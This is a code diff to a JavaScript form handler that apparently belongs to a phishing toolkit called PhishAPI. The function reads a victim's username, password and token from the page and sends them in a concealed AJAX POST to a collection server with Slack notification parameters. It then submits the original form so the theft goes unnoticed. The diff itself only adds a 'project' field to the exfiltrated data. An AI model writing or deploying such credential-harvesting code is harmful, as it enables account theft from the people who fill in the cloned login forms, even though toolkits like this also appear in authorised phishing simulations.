@@ -3,8 +3,9 @@ function SubForm(APIPortal,RedirectURL,FormName){
 	var APIPortal = SubForm.arguments[0];
 	var RedirectURL = SubForm.arguments[1];
 	var FormName = SubForm.arguments[2];
-	var SlackBotName = SubForm.arguments[3];
-	var SlackEmoji = SubForm.arguments[4];
+	var Project = SubForm.arguments[3];
+	var SlackBotName = SubForm.arguments[4];
+	var SlackEmoji = SubForm.arguments[5];
 	// Vistim Controlled Variables
 	var Username = document.getElementById("username").value;
 	var Password = document.getElementById("password").value;
@@ -19,7 +20,7 @@ function SubForm(APIPortal,RedirectURL,FormName){
         // Post Transparent AJAX Request to PhishAPI Server
 		url:APIPortal,
         type:'post',
-		data:'username='+Username+'&password='+Password+'&token='+Token+'&slackbotname='+SlackBotName+'&slackemoji='+SlackEmoji,
+		data:'project='+Project+'&username='+Username+'&password='+Password+'&token='+Token+'&slackbotname='+SlackBotName+'&slackemoji='+SlackEmoji,
         success:function (){		
 				// Submit Original Form
 				var x = document.getElementsByName(FormName);
